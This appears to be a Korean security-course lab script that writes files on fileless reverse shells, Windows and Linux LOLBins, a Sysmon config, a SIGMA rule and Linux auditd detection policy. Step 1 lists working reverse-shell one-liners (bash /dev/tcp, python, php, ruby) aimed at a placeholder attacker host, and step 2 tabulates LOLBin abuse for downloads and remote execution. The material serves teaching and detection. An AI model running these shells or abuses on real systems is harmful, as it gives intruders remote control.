    1) [Linux 리버스 셸 원라이너 (교육 만)] mkdir -p ~/w09; cat > ~/w09/oneliners.txt <<EOF
       === Linux Fileless reverse shell 원라이너 (교육 - 실 실행 X) ===
       bash -i >& /dev/tcp/ATTACKER/4444 0>&1
       python3 -c 'import socket,os,pty; s=socket.socket(); s.connect((\"X\",4444));
         [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn(\"/bin/bash\")'
       perl -e 'use Socket; ...'
       php -r '\$s=fsockopen(\"X\",4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'
       ruby -rsocket -e 'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"X\",4444))'

       Fileless 특징: 디스크 의 .sh 파일 X, 메모리 만 실행, audit 추적 어려움
       EOF
       cat ~/w09/oneliners.txt. MITRE T1059.004 + T1027 매핑.

    2) [LOLBin 예시 - Living Off the Land] cat > ~/w09/lolbins.md <<EOF
       # Windows LOLBins (Living Off the Land Binaries)
       | Binary | 정상 용도 | 악용 |
       |---|---|---|
       | certutil.exe | 인증서 관리 | -urlcache 으로 file download |
       | bitsadmin.exe | BITS download | malware download |
       | wmic.exe | WMI query | remote execution |
       | mshta.exe | HTA file 실행 | JavaScript/VBScript exec |
       | regsvr32.exe | DLL 등록 | scrobj.dll 의 remote sct 실행 |
       | rundll32.exe | DLL 호출 | shellcode 실행 |
       | powershell.exe | PowerShell | base64 encoded payload exec |

       # Linux LOLBins (GTFOBins)
       awk, find, vim, less, sed, perl, python — sudo 가능 시 shell escape
       EOF
       cat ~/w09/lolbins.md.

    3) [Sysmon 설정 (Windows)] cat > ~/w09/sysmon-config.xml <<EOF
       <Sysmon schemaversion="4.50">
         <EventFiltering>
           <ProcessCreate onmatch="include">
             <Image condition="contains">certutil.exe</Image>
             <Image condition="contains">bitsadmin.exe</Image>
             <Image condition="contains">mshta.exe</Image>
             <Image condition="contains">regsvr32.exe</Image>
             <Image condition="contains">powershell.exe</Image>
             <CommandLine condition="contains">-urlcache</CommandLine>
             <CommandLine condition="contains">-EncodedCommand</CommandLine>
             <CommandLine condition="contains">FromBase64String</CommandLine>
           </ProcessCreate>
           <NetworkConnect onmatch="include">
             <Image condition="contains">powershell.exe</Image>
             <Image condition="contains">cmd.exe</Image>
           </NetworkConnect>
         </EventFiltering>
       </Sysmon>
       EOF
       cat ~/w09/sysmon-config.xml.

    4) [LOLBin SIGMA] cat > ~/w09/sigma-lolbin.yml <<EOF
       title: LOLBin Suspicious Command Line
       id: 00000000-0000-0000-0000-000000000009
       logsource: {product: windows, service: sysmon}
       detection:
         selection_certutil:
           EventID: 1
           Image|endswith: '\\certutil.exe'
           CommandLine|contains:
             - '-urlcache'
             - '-decode'
         selection_pwsh_b64:
           EventID: 1
           Image|endswith: '\\powershell.exe'
           CommandLine|contains:
             - '-EncodedCommand'
             - 'FromBase64String'
         condition: selection_certutil or selection_pwsh_b64
       level: high
       tags: [attack.t1059.001, attack.t1140]
       EOF
       cat ~/w09/sigma-lolbin.yml.

    5) [Linux 인터프리터 정책 + 종합] cat > ~/w09/linux-policy.md <<EOF
       # Linux 인터프리터 정책 (Fileless 방어)

       ## 1. AppArmor / SELinux 의 인터프리터 제한
       - bash/python/perl 의 network 호출 deny (default)
       - 필요 시 만 explicit profile 적용

       ## 2. auditd 의 execve + network
       -a always,exit -F arch=b64 -S execve -k execve_audit
       -a always,exit -F arch=b64 -S connect -k connect_audit
       → 모든 execve + connect 의 추적 (성능 영향 검토)

       ## 3. eBPF 의 syscall 분석
       - bcc/bpftrace 의 execsnoop, opensnoop, tcpconnect 의 실시간 monitoring
       - Tetragon / Cilium 의 runtime detection

       ## 4. 인터프리터 의 network 차단 (의심 상황)
       - bash 의 /dev/tcp/ 사용 차단 (sysctl + AppArmor)
       - python 의 socket import detection

       ## 5. base64 decode 의 detection
       - bash -c "base64 -d | bash" 패턴 의 auditd alert
       EOF
       cat ~/w09/linux-policy.md.

    cleanup: rm -rf ~/w09.

